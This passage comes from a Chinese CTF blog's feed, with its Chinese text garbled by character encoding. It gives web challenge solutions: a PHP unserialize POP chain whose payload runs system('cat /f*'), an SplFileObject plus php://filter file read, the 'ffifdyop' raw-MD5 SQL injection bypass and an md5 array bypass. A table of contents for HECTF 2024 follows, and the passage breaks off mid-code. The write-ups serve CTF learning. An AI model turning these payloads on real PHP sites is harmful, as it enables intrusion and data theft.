å‚å®ç° RCEã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entrance</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">entrance</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start = <span class="keyword">new</span> <span class="title function_ invoke__">springboard</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start-&gt;middle = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start-&gt;middle-&gt;end = <span class="string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h3 id="gdouctf-2023åæ–¹å‘çš„é’Ÿ"><a class="markdownIt-Anchor" href="#gdouctf-2023åæ–¹å‘çš„é’Ÿ">#</a> [GDOUCTF 2023] åæ–¹å‘çš„é’Ÿ:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$rank</span>,<span class="variable">$salary</span> = <span class="number">10000</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="variable">$rank</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$leader</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="variable">$leader</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hahaha</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name != <span class="string">&#x27;one class&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;name != <span class="string">&#x27;ing&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="string">&#x27;department&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$department</span>,<span class="variable">$ceo</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="variable">$department</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="variable">$ceo</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">IPO</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;department-&gt;<span class="title function_ invoke__">hahaha</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">IPO</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹ç®€å•çš„ PHP ååºåˆ—åŒ–ï¼Œä¸è¿‡éœ€è¦ç»“åˆåŸç”Ÿç±»å»è¯»å–æ–‡ä»¶ï¼Œå› ä¸º <code>school</code>  ç±»ä¸­çš„ <code>IPO</code>  æ–¹æ³•å­˜åœ¨å¯ä»¥æ§åˆ¶çš„è‡ªå®šä¹‰ new çš„å¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥æƒ³åˆ°çš„æ˜¯ç”¨ <code>SplFileObject</code>  åŸç”Ÿç±»æ¥è¯»å–æ–‡ä»¶ï¼Œåˆšå¥½å­˜åœ¨ echo å¯ä»¥è¾“å‡ºï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;ing&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="string">&#x27;department&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;one class&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="keyword">new</span> teacher;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="keyword">new</span> classroom;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="string">&#x27;ong&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> school;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//POSTï¼š</span></span><br><span class="line"><span class="comment">//a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020easy_md5"><a class="markdownIt-Anchor" href="#bjdctf-2020easy_md5">#</a> [BJDCTF 2020]easy_md5ï¼š</h3><p>â€‹è¿™ä¸ªè€ƒç‚¹æœ‰ç‚¹æ„æ€ï¼Œéœ€è¦ç‰¹åˆ«å…³æ³¨ä¸‹ï¼Œæ‰“å¼€ç½‘é¡µä¹‹åæ˜¯ä¸€ä¸ªæœç´¢æ¡†ï¼ŒæŠ“åŒ…çœ‹å“åº”å¤´å‘ç°äº†ä¸€ä¸ª hintï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5(<span class="built_in">$</span>pass,true)</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå‡ºç°äº†è¿™ä¸ªè€ƒç‚¹ï¼Œ <code>md5($pass,true)</code>  çš„ç»•è¿‡æ–¹å¼ï¼Œç…§ä¾‹æ¥è¯´ï¼Œè¿™é‡ŒçŒœæµ‹æ˜¯ä¸‡èƒ½å¯†ç ï¼Œéœ€è¦ md5 åŠ å¯†ä¹‹åæ‰”åˆ° MySQL æŸ¥è¯¢æ—¶å€™å¾—åˆ°çš„æ˜¯ <code>'or'[å‚æ•°]'</code>  è¿™ç§ç±»å‹çš„ç»“æœï¼Œæ‰€ä»¥ï¼Œé—®äº†ä¸‹ AIï¼ŒAi ç»™å‡ºäº†æ­£ç¡®ç­”æ¡ˆï¼Œå°±æ˜¯  <code>ffifdyop</code> ï¼Œè¿™é‡Œç»è¿‡åŠ å¯†åå¾—åˆ°çš„æ˜¯ï¼š <code>'or'6\xbb\xd9\x83\x1a\xe8\xd2\x1d\xc3\xe5\x8e\x8a</code>  çš„ 16 è¿›åˆ¶æ•°ï¼ŒMySQL é‡ŒæŸ¥è¯¢æ˜¯åƒä¸Šé¢æ•°æ®ä¸€æ ·ï¼Œä¹Ÿå°±æˆåŠŸæ‰§è¡Œäº†æ³¨å…¥äº†ã€‚</p><p>â€‹ä¸‹ä¸€æ­¥ï¼Œè·³è½¬è¿›äº†ä¸‹ä¸€ä¸ªé¡µé¢ä¹‹åï¼Œç›´æ¥è¯»å–æºä»£ç ï¼Œçœ‹åˆ°äº†æç¤ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: levell14.php&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹ç›´æ¥è®¿é—® <code>levell14.php</code>  æ–‡ä»¶ï¼Œå¾—åˆ°æœ€åä¸€æ­¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç›´æ¥æ•°ç»„ç»•è¿‡ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=1<span class="built_in">&amp;</span>param2[]=2</span><br></pre></td></tr></table></figure><h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwnï¼š</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä»nssctfå¼€å§‹çš„å¤å»ºä¹‹è·¯&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ä»nssctfå¼€å§‹çš„å¤å»ºä¹‹è·¯&quot;&gt;#&lt;/a&gt; ä» NSSCTF å¼€å§‹çš„å¤å»ºä¹‹è·¯&lt;/h1&gt;
&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a class=&quot;markdownIt-Anc</summary>
      
    
    
    
    <category term="å‘ç”µæ—¥å¸¸" scheme="http://blog.g01den.top/categories/Daily/"/>
    
    
    <category term="Daily life" scheme="http://blog.g01den.top/tags/Daily-life/"/>
    
  </entry>
  
  <entry>
    <title>ã€2024ã€‘HECTF-ä¸ªäººæ•´ç†å‘</title>
    <link href="http://blog.g01den.top/posts/de34fe7b.html"/>
    <id>http://blog.g01den.top/posts/de34fe7b.html</id>
    <published>2024-12-09T12:59:36.000Z</published>
    <updated>2024-12-09T13:13:34.107Z</updated>
    
    <content type="html"><![CDATA[<p><ul class="markdownIt-TOC"><li><a href="#wp">WPï¼š</a><ul><li><a href="#web">Webï¼š</a><ul><li><a href="#are-you-happy">Are you happy?ï¼š</a></li><li><a href="#baby_unserialize">baby_unserializeï¼š</a></li><li><a href="#baby_sql">baby_sqlï¼š</a><ul><li><a href="#%E9%9D%9E%E9%A2%84%E6%9C%9F">éé¢„æœŸï¼š</a></li><li><a href="#%E9%A2%84%E6%9C%9F%E8%A7%A3">é¢„æœŸè§£</a></li></ul></li><li><a href="#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99">ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™ï¼š</a></li><li><a href="#ezweb">ezweb</a></li><li><a href="#ezjava">ezjavaï¼š</a></li></ul></li><li><a href="#misc">Miscï¼š</a><ul><li><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85">ç®€å•çš„å‹ç¼©åŒ…ï¼š</a></li></ul></li><li><a href="#pwn">Pwn</a><ul><li><a href="#sign-in">sign in</a></li><li><a href="#find-eggy">find eggyï¼š</a></li><li><a href="#arcaea_sorting">Arcaea_Sortingï¼š</a></li><li><a href="#arcaea_sorting_revenge">Arcaea_Sorting_Revengeï¼š</a></li></ul></li><li><a href="#re">Reï¼š</a><ul><li><a href="#babyre">babyreï¼š</a></li></ul></li><li><a href="#crypto">Cryptoï¼š</a><ul><li><a href="#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89">è¿·èŒ«çš„è‰¾ç±³è‰</a></li><li><a href="#seven-more">seven more</a></li><li><a href="#%E7%BF%BB%E4%B8%80%E7%BF%BB">ç¿»ä¸€ç¿»ï¼š</a></li><li><a href="#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF">ä¸åˆæ ¼çš„é­”è¯ï¼š</a></li><li><a href="#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6">æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦</a></li></ul></li></ul></li><li><a href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%E8%AE%B0%E5%BD%95">é¢˜ç›®æè¿°è®°å½•ï¼š</a><ul><li><a href="#web-2">Webï¼š</a><ul><li><a href="#are-u-happy"><strong>Are u happy</strong></a></li><li><a href="#baby_sql-2"><strong>baby_sql</strong></a></li><li><a href="#baby_unserialize-2"><strong>baby_unserialize</strong></a></li><li><a href="#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99-2"><strong>ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™</strong></a></li><li><a href="#ezweb-2"><strong>ezweb</strong></a></li><li><a href="#ezjava-2">ezjava</a></li></ul></li><li><a href="#re-2">Re</a><ul><li><a href="#babyre-2"><strong>babyre</strong></a></li><li><a href="#littleasm"><strong>littleasm</strong></a></li><li><a href="#pepy"><strong>PE?py?</strong></a></li><li><a href="#easyree"><strong>easyree</strong></a></li><li><a href="#ezandroid"><strong>ezAndroid</strong></a></li></ul></li><li><a href="#pwn-2">Pwn</a><ul><li><a href="#sign-in-2"><strong>sign in</strong></a></li><li><a href="#find-eggy-2"><strong>find eggy</strong></a></li><li><a href="#arcaea_sorting-2"><strong>Arcaea_Sorting</strong></a></li><li><a href="#arcaea_sorting_revenge-2"><strong>Arcaea_Sorting_Revenge</strong></a></li><li><a href="#%E5%96%B5%E5%96%B5%E5%96%B5"><strong>å–µå–µå–µ</strong></a></li><li><a href="#lip"><strong>lip</strong></a></li></ul></li><li><a href="#crypto-2">Crypto</a><ul><li><a href="#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89-2"><strong>è¿·èŒ«çš„è‰¾ç±³è‰</strong></a></li><li><a href="#%E7%BF%BB%E4%B8%80%E7%BF%BB-2"><strong>ç¿»ä¸€ç¿»</strong></a></li><li><a href="#seven-more-2"><strong>seven more</strong></a></li><li><a href="#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6-2"><strong>æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦</strong></a></li><li><a href="#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF-2"><strong>ä¸åˆæ ¼çš„é­”è¯</strong></a></li></ul></li><li><a href="#misc-2">Misc</a><ul><li><a href="#rem_you"><strong>Rem_You</strong></a></li><li><a href="#funny"><strong>funny</strong></a></li><li><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85-2"><strong>ç®€å•çš„å‹ç¼©åŒ…</strong></a></li><li><a href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E4%BB%93%E5%BA%93"><strong>æ¶åŠ¿åŠ›çš„ä»“åº“</strong></a></li><li><a href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95"><strong>æ¶åŠ¿åŠ›çš„èŠå¤©è®°å½•</strong></a></li><li><a href="#baby_unserialize-3"><strong>baby_unserialize</strong></a></li><li><a href="#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99-3"><strong>ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™</strong></a></li><li><a href="#ezweb-3"><strong>ezweb</strong></a></li><li><a href="#ezjava-3">ezjava</a></li></ul></li><li><a href="#re-3">Re</a><ul><li><a href="#babyre-3"><strong>babyre</strong></a></li><li><a href="#littleasm-2"><strong>littleasm</strong></a></li><li><a href="#pepy-2"><strong>PE?py?</strong></a></li><li><a href="#easyree-2"><strong>easyree</strong></a></li><li><a href="#ezandroid-2"><strong>ezAndroid</strong></a></li></ul></li><li><a href="#pwn-3">Pwn</a><ul><li><a href="#sign-in-3"><strong>sign in</strong></a></li><li><a href="#find-eggy-3"><strong>find eggy</strong></a></li><li><a href="#arcaea_sorting-3"><strong>Arcaea_Sorting</strong></a></li><li><a href="#arcaea_sorting_revenge-3"><strong>Arcaea_Sorting_Revenge</strong></a></li><li><a href="#%E5%96%B5%E5%96%B5%E5%96%B5-2"><strong>å–µå–µå–µ</strong></a></li><li><a href="#lip-2"><strong>lip</strong></a></li></ul></li><li><a href="#crypto-3">Crypto</a><ul><li><a href="#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89-3"><strong>è¿·èŒ«çš„è‰¾ç±³è‰</strong></a></li><li><a href="#%E7%BF%BB%E4%B8%80%E7%BF%BB-3"><strong>ç¿»ä¸€ç¿»</strong></a></li><li><a href="#seven-more-3"><strong>seven more</strong></a></li><li><a href="#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6-3"><strong>æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦</strong></a></li><li><a href="#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF-3"><strong>ä¸åˆæ ¼çš„é­”è¯</strong></a></li></ul></li><li><a href="#misc-3">Misc</a><ul><li><a href="#rem_you-2"><strong>Rem_You</strong></a></li><li><a href="#funny-2"><strong>funny</strong></a></li><li><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85-3"><strong>ç®€å•çš„å‹ç¼©åŒ…</strong></a></li><li><a href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E4%BB%93%E5%BA%93-2"><strong>æ¶åŠ¿åŠ›çš„ä»“åº“</strong></a></li><li><a href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95-2"><strong>æ¶åŠ¿åŠ›çš„èŠå¤©è®°å½•</strong></a></li></ul></li></ul></li></ul>(è¿™é‡Œå†™ç›®å½•æ ‡é¢˜)<br> æœ¬æ¥æƒ³æ•´ç†ä¸‹æ‰€æœ‰çš„ wp çš„ï¼Œç»“æœæœ€åå‘ç°å¥½å¤šéƒ½ä¸ä¼šï¼Œåˆ«çš„ä¸ä¼šçš„æŠ„ wp çš„è¯ä¼¼ä¹ä¹Ÿå°±åªæœ‰æŠ„å¤§ä½¬ä»¬äº¤ä¸Šæ¥çš„ wpï¼Œä¸å¤§å¥½ï¼Œæ‰€ä»¥æœ€ååªå†™äº†éƒ¨åˆ† wpï¼Œå‰©ä¸‹ç­‰åˆ°å­¦é•¿ä»¬æŠŠå®˜æ–¹ wp ä¼ ä¸Šå»å†æ•´ç†ã€‚</p><h1 id="wp"><a class="markdownIt-Anchor" href="#wp">#</a> WPï¼š</h1><h2 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Webï¼š</h2><h3 id="are-you-happy"><a class="markdownIt-Anchor" href="#are-you-happy">#</a> Are you happy?ï¼š</h3><p>â€‹game.js é‡Œæ‰¾ï¼Œflag åœ¨é‡Œé¢ï¼Œæ ¹æ® flag çš„æ ¼å¼ï¼Œflag å¼€å¤´æ˜¯ HECTFï¼Œå°†è¿™ä¸ªå­—æ®µ base64 ç¼–ç ä¸‹ï¼Œç„¶åå°±å¯ä»¥æœç´¢äº†ã€‚</p><h3 id="baby_unserialize"><a class="markdownIt-Anchor" href="#baby_unserialize">#</a> baby_unserializeï¼š</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 